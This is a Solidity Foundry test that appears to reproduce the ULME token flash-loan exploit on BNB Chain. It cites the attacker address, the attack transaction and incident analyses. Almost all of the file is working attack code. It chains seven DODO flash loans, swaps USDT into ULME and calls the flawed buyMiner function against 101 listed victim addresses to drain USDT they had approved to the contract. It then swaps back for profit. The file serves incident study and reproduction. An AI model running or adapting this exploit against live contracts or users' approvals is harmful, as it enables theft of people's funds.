// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~250k US$ which resulted in ~50k profit
// Attacker : 0x056c20ab7e25e4dd7e49568f964d98e415da63d3
// Attack Contract : 0x8523c7661850d0da4d86587ce9674da23369ff26
// Vulnerable Contract : 0xAE975a25646E6eB859615d0A147B909c13D31FEd (ULME Token)
// Attack Tx : https://phalcon.blocksec.com/tx/bsc/0xdb9a13bc970b97824e082782e838bdff0b76b30d268f1d66aac507f1d43ff4ed

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1584839309781135361
// Beosin: https://twitter.com/BeosinAlert/status/1584888021299916801
// Neptune Mutual: https://medium.com/neptune-mutual/decoding-ulme-token-flash-loan-attack-56470d261787

interface IULME is IERC20 {
    function buyMiner(address user, uint256 usdt) external returns (bool);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IDPP {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ULMEAttacker is Test {
    CheatCodes constant cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address constant dodo1 = 0x910d4354d34E0F1EF31d22a687BE191A1aE0cA5F;
    address constant dodo2 = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    address constant dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant dodo4 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address constant dodo5 = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address constant dodo6 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address constant dodo7 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IULME constant ulme = IULME(0xAE975a25646E6eB859615d0A147B909c13D31FEd);

    function setUp() public {
        cheats.createSelectFork("bsc");
        cheats.label(address(usdt), "USDT");
        cheats.label(address(dodo1), "dodo1");
        cheats.label(address(dodo2), "dodo2");
        cheats.label(address(dodo3), "dodo3");
        cheats.label(address(dodo4), "dodo4");
        cheats.label(address(dodo5), "dodo5");
        cheats.label(address(dodo6), "dodo6");
        cheats.label(address(dodo7), "dodo7");
        cheats.label(address(router), "router");
        cheats.label(address(ulme), "ulme");
    }

    function testExploit() external {
        uint256 attackBlockNumber = 22_476_695;
        cheats.rollFork(attackBlockNumber);

        uint256 startBalance = usdt.balanceOf(address(this));
        emit log_named_decimal_uint("Initial attacker USDT", startBalance, usdt.decimals());
        uint256 dodo1USDT = usdt.balanceOf(dodo1);
        // start flashloan
        IDVM(dodo1).flashLoan(0, dodo1USDT, address(this), abi.encode("dodo1"));

        // attack end
        uint256 endBalance = usdt.balanceOf(address(this));
        emit log_named_decimal_uint("Total profit USDT", endBalance - startBalance, usdt.decimals());
    }

    function dodoCall(
        address, /*sender*/
        uint256, /*baseAmount*/
        uint256 quoteAmount,
        bytes calldata /*data*/
    ) internal {
        if (msg.sender == dodo1) {
            uint256 dodo2USDT = usdt.balanceOf(dodo2);
            IDPPAdvanced(dodo2).flashLoan(0, dodo2USDT, address(this), abi.encode("dodo2"));
            usdt.transfer(dodo1, quoteAmount);
        } else if (msg.sender == dodo2) {
            uint256 dodo3USDT = usdt.balanceOf(dodo3);
            IDPPOracle(dodo3).flashLoan(0, dodo3USDT, address(this), abi.encode("dodo3"));
            usdt.transfer(dodo2, quoteAmount);
        } else if (msg.sender == dodo3) {
            uint256 dodo4USDT = usdt.balanceOf(dodo4);
            IDPP(dodo4).flashLoan(0, dodo4USDT, address(this), abi.encode("dodo4"));
            usdt.transfer(dodo3, quoteAmount);
        } else if (msg.sender == dodo4) {
            uint256 dodo5USDT = usdt.balanceOf(dodo5);
            IDPPAdvanced(dodo5).flashLoan(0, dodo5USDT, address(this), abi.encode("dodo5"));
            usdt.transfer(dodo4, quoteAmount);
        } else if (msg.sender == dodo5) {
            uint256 dodo6USDT = usdt.balanceOf(dodo6);
            IDPPOracle(dodo6).flashLoan(0, dodo6USDT, address(this), abi.encode("dodo6"));
            usdt.transfer(dodo5, quoteAmount);
        } else if (msg.sender == dodo6) {
            uint256 dodo7USDT = usdt.balanceOf(dodo7);
            IDPPOracle(dodo7).flashLoan(0, dodo7USDT, address(this), abi.encode("dodo7"));
            usdt.transfer(dodo6, quoteAmount);
        } else if (msg.sender == dodo7) {
            // flashloan end, start attack
            emit log_named_decimal_uint("Total borrowed USDT", usdt.balanceOf(address(this)), usdt.decimals());

            // approve before swap
            usdt.approve(address(router), type(uint256).max);
            ulme.approve(address(router), type(uint256).max);
            USDT2ULME();
            emit log_named_decimal_uint("Total exchanged ULME", ulme.balanceOf(address(this)), ulme.decimals());

            address[] memory victims = new address[](101);
            victims[0] = 0x4A005e5E40Ce2B827C873cA37af77e6873e37203;
            victims[1] = 0x5eCe8A3382FD5317EBa6670cAe2F70ccA8845859;
            victims[2] = 0x065D5Bfb0bdeAdA1637974F76AcF54428D61c45d;
            victims[3] = 0x0C678244aaEd33b6c963C2D6B14950d35EAB899F;
            victims[4] = 0x1F0D9584bC8729Ec139ED5Befe0c8677994FcB35;
            victims[5] = 0x6b8cdC12e9E2F5b3620FfB12c04C5e7b0990aaf2;
            victims[6] = 0xA9882080e01F8FD11fa85F05f7c7733D1C9837DF;
            victims[7] = 0x1dFBBECc9304f73caD14C3785f25C1d1924ACB0B;
            victims[8] = 0x0b038F3e5454aa745Ff029706656Fed638d5F73a;
            victims[9] = 0x0Bd084decfb04237E489cAD4c8A559FC5ce44f90;
            victims[10] = 0x5EB2e4907f796C9879181041fF633F33f8858d93;
            victims[11] = 0x0DE272Ef3273d49Eb608296A783dBd36488d3989;
            victims[12] = 0xAe800360ac329ceA761AFDa2d3D55Bd12932Ab62;
            victims[13] = 0xf7726cA96bF1Cee9c6dC568ad3A801E637d10076;
            victims[14] = 0x847aA967534C31b47d46A2eEf5832313E36b25E2;
            victims[15] = 0x6c91DA0Dc1e8ab02Ab1aB8871c5aE312ef04273b;
            victims[16] = 0xb14018024600eE3c747Be98845c8536994D40A5D;
            victims[17] = 0x8EcdD8859aA286c6bae1f570eb0105457fD24cd2;
            victims[18] = 0x6ff1c499C13548ee5C9B1EA6d366A5E11EcA60ca;
            victims[19] = 0xC02eb88068A40aEe6E4649bDc940e0f792e16C22;
            victims[20] = 0xa2D5b4de4cb10043D190aae23D1eFC02E31F1Cb6;
            victims[21] = 0x5E05B8aC4494476Dd539e0F4E1302806ec52ED6F;
            victims[22] = 0xDeb6FDCa49e54c8b0704C5B3f941ED6319139816;
            victims[23] = 0x0E6533B8d6937cC8b4c9be31c00acBfaCB6760a5;
            victims[24] = 0xCE0Fd72a7cF07EB9B20562bbb142Cb711A42867f;
            victims[25] = 0x4868725bf6D395148def99E6C43074C774e7AC1D;
            victims[26] = 0x2F1f2BAF34703d16BcfD62cF64A7A5a44Ad6c9d4;
            victims[27] = 0x3d49Bdf065f009621A02c5Fd88f72ed0A3910521;
            victims[28] = 0x6E31C08f1938BE5DF98F8968747bB34802D76E50;
            victims[29] = 0x4F741D8DCDEdd74DadeA6cd3A7e41ECb28076209;
            victims[30] = 0x5480c14b9841C89527F0D1A55dDC0D273Aae3609;
            victims[31] = 0xb3725dA113eFFd7F39BE62A5E349f26e82a949fF;
            victims[32] = 0x9d83Dee089a5fBfB5F2F1268EDB80aeA8Ba5aF16;
            victims[33] = 0x0c02F3d6962245E934A3fe415EAbA6bf570c1883;
            victims[34] = 0x0182cfEFB268DD510ee77F32527578BEAC6238e2;
            victims[35] = 0x78598Ac3943454682477852E846532F73d5cFE5F;
            victims[36] = 0xd067c7585425e1e5AA98743BdA5fB65212751476;
            victims[37] = 0x3507ddF8b74dAEd03fE76EE74B7d6544F3B254B7;
            victims[38] = 0xEca4Fd6b05E5849aAf5F2bEE5Eb3B50f8C4f4E3c;
            victims[39] = 0xAA279af072080f3e453A916b77862b4ff6eB245E;
            victims[40] = 0x4e505a21325A6820E2099Bbd15f6832c6f696a3c;
            victims[41] = 0xA5b63F7b40A5Cc5ee6B9dB7cef2415699627Ee89;
            victims[42] = 0x3dd624cEd432DDc32fA0afDaE855b76aa1431644;
            victims[43] = 0x17f217Fdeff7Ee4a81a4b2f42c695EDC20806957;
            victims[44] = 0x41819F36878d15A776225928CD52DC56acCFD553;
            victims[45] = 0x61ca76703C5aF052c9b0aCc2Bab0276875DDd328;
            victims[46] = 0x2956bCc87450B424C7305C4c6CF771196c23A52E;
            victims[47] = 0x03be05224803c89f3b8C806d887fD84A20D16e5C;
            victims[48] = 0x3C97320bf030C2c120FdCe19023A571f3fbB6184;
            victims[49] = 0xc52021150ca5c32253220bE328ddC05F86d3a619;
            victims[50] = 0x6d7aAa35c4B2dBD6F1E979e04884AeE1B4FBB407;
            victims[51] = 0x7c80162197607312EC99d7c9e34720B3572d6D16;
            victims[52] = 0x15D92C909826017Ff0184eea3e38c36489517A7C;
            victims[53] = 0xC07fa7a1F14A374d169Dc593261843B4A6d9C1C3;
            victims[54] = 0x4b415F48FA70a9a0050F6380e843790260973808;
            victims[55] = 0x9CeEeB927b85d4bD3b4e282c17EB186bCDC4Dd15;
            victims[56] = 0x0eb76DAf60bdF637FC207BFb545B546D5Ee208B1;
            victims[57] = 0x96D7F1660e708eDdF2b6f655ADB61686B59bC190;
            victims[58] = 0xDCeB637E38dBae685222eEf6635095AaaEC65496;
            victims[59] = 0x36083Aac533353317C24Bd53227DbF29Ed9F384c;
            victims[60] = 0x94913f31fBaFcb0ae6e5EfA4C18E3ee301097eab;
            victims[61] = 0x188c50F43f9fA0026BAaa7d8cF83c358311f0500;
            victims[62] = 0x3d8dcC70777643612564D84176f769A1417987a5;
            victims[63] = 0x00273CEEe956543c801429A886cD0E1a79f5d8cA;
            victims[64] = 0xC43C5F785D06b582E3E710Dc0156267Fd135C602;
            victims[65] = 0x0406aefd83f20700D31a49F3d6fdbF52e8F7D0Ef;
            victims[66] = 0xBeD8C7433dE90D349f96C6AE82d4eb4482AA6Bf7;
            victims[67] = 0xDe436F7742cE08f843f8d84e7998E0B7e4b73101;
            victims[68] = 0xd38c6E26aa4888DE59C2EAaD6138B0b66ABBF21D;
            victims[69] = 0xc0dFb3219F0C72E902544a080ba0086da53F9599;
            victims[70] = 0xFAAD61bd6b509145c2988B03529fF21F3C9970B2;
            victims[71] = 0x9f9BEEF87Cfe141868E21EacbDDB48DF6c54C2F2;
            victims[72] = 0x6614e2e86b4646793714B1fa535fc5875bB446d5;
            victims[73] = 0x7eFe3780b1b0cde8F300443fbb4C12a73904a948;
            victims[74] = 0xAd813b95A27233E7Abd92C62bBa87f59Ca8F9339;
            victims[75] = 0x13F33854cE08e07D20F5C0B16884267dde21a501;
            victims[76] = 0x59ebcde7Ec542b5198095917987755727725fD1d;
            victims[77] = 0xe5A5B86119BD9fd4DF5478AbE1d3D9F46BF3Ba5F;
            victims[78] = 0xC2724ed2B629290787Eb4A91f00aAFE58F262025;
            victims[79] = 0xDFa225eB03F9cc2514361A044EDDA777eA51b9ad;
            victims[80] = 0x85d981E3CDdb402F9Ae96948900971102Ee5d6b5;
            victims[81] = 0xb0Ac3A88bFc919cA189f7d4AbA8e2F191b37A65B;
            victims[82] = 0x1A906A9A385132D6B1a62Bb8547fD20c38dd79Bb;
            victims[83] = 0x9d36C7c400e033aeAc391b24F47339d7CB7bc033;
            victims[84] = 0x5B19C1F57b227C67Bef1e77b1B6796eF22aEe21B;
            victims[85] = 0xbfd0785a924c3547544C95913dAC0b119865DF9e;
            victims[86] = 0xF003E6430fbC1194ffA3419629A389B7C113F083;
            victims[87] = 0xfa30Cd705eE0908e2Dac4C19575F824DED99818E;
            victims[88] = 0xe27027B827FE2FBcFCb56269d4463881AA6B8955;
            victims[89] = 0xEddD7179E461F42149104DCb87F3b5b657a05399;
            victims[90] = 0x980FcDB646c674FF9B6621902aCB8a4012974093;
            victims[91] = 0x2eBc77934935980357A894577c2CC7107574f971;
            victims[92] = 0x798435DE8fA75993bFC9aD84465d7F812507b604;
            victims[93] = 0x1Be117F424e9e6f845F7b07C072c1d67F114f885;
            victims[94] = 0x434e921bDFe74605BD2AAbC2f6389dDBA2d37ACA;
            victims[95] = 0xaFacAc64426D1cE0512363338066cc8cABB3AEa2;
            victims[96] = 0x2693e0A37Ea6e669aB43dF6ee68b453F6D6F3EBD;
            victims[97] = 0x77Aee2AAc9881F4A4C347eb94dEd088aD49C574D;
            victims[98] = 0x951f4785A2A61fe8934393e0ff6513D6946D8d97;
            victims[99] = 0x2051cE514801167545E74b5DD2a8cF5034c6b17b;
            victims[100] = 0xC2EE820756d4074d887d762Fd8F70c4Fc47Ab47f;

            uint256 lost = 0;
            // start exploit buyMiner function
            for (uint256 i; i < victims.length; i++) {
                address victim = victims[i];
                uint256 allowance = usdt.allowance(victim, address(ulme));
                uint256 balance = usdt.balanceOf(victim);
                uint256 available = balance <= allowance ? balance : allowance; // available USDT

                if (available > 0) {
                    uint256 amount = available * 10 / 11; // according to the buyMiner function, *10/11 to drain all USDT
                    ulme.buyMiner(victim, amount);
                    lost += available;
                } else {
                    emit log_named_address("Insufficient USDT", victim);
                }
            }
            emit log_named_decimal_uint("Total lost USDT", lost, usdt.decimals());

            ULME2USDT();

            usdt.transfer(dodo7, quoteAmount);
        }
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    function USDT2ULME() internal {
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(ulme);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1_000_000 ether, 0, path, address(this), block.timestamp
        );
    }

    function ULME2USDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(ulme);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens( // ULME token has transfer fees
            ulme.balanceOf(address(this)) - 100, // can not swap all, according to the transactionFee function
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
